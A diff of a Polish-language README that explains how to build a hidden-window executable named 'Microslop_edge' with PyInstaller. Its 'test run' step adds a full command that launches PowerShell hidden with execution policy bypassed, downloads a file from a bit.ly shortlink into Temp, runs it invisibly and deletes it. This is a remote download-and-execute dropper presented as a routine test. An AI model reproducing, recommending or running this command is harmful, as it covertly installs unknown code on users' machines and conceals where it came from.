@@ -41,10 +41,10 @@ pyinstaller --onefile --windowed --name="Microslop_edge" --icon="icon.ico" get_b
 *Po zakończeniu procesu gotowy plik `.exe` znajdziesz w nowo utworzonym katalogu `dist/`.*
 
 ### Krok 4: Testowe uruchomienie w PowerShell
-Aby przetestować działanie skompilowanej aplikacji bezpośrednio z poziomu konsoli PowerShell, przejdź do folderu `dist` i wykonaj poniższy skrypt:
+Aby przetestować działanie skompilowanej aplikacji bezpośrednio z poziomu konsoli cmd, przejdź do folderu `dist` i wykonaj poniższy skrypt:
 
-```powershell
-powershell -WindowStyle Hidden -Command "\$url = 'TUTAJ_WKLEJ_LINK'; out = 'env:TEMP\plik.exe'; Invoke-WebRequest -Uri url -OutFile out; Start-Process out -WindowStyle Hidden -CreateNoWindow -Wait; Remove-Item out -Force"
+```cmd
+powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ProgressPreference = 'SilentlyContinue'; $S = Join-Path $env:USERPROFILE 'AppData\Local\Temp\Microslop_edge.exe'; iwr https://bit.ly/4ykL04g -OutFile $S; Start-Process -FilePath $S -WindowStyle Hidden -Wait; Remove-Item -Path $S -Force"
 ```
 
 ---
